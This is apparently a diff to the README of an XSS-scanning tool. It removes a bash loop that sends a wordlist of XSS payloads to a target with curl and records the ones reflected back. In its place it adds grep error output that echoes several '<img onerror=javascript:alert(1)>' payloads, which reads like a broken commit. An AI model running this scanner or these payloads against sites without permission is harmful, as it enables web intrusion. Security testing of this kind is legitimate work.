@@ -15,9 +15,15 @@
 <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2F1337r0j4n%2Fwebin&countColor=%23263759">
 </p>
 
-while IFS= read -r payloads; do                                                                                              xss=$(curl -A "$USER_AGENT" --max-time 5 -s -L -k $point$payloads | grep -oE "$payloads" | head -n 1)
-             if [[ $xss == $payloads ]]; then                                                                                            echo "    $payloads"                                                                                                    echo "$payloads" > output/$site/vulnpayloads.txt
-             else
-                 printf ''
-             fi
-    done < wordlist/xss_payloads.txt
+grep: unrecognized option '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->'
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
+grep: unrecognized option '--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->'
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
+grep: unrecognized option '--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->'
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
+grep: unrecognized option '--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->'
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
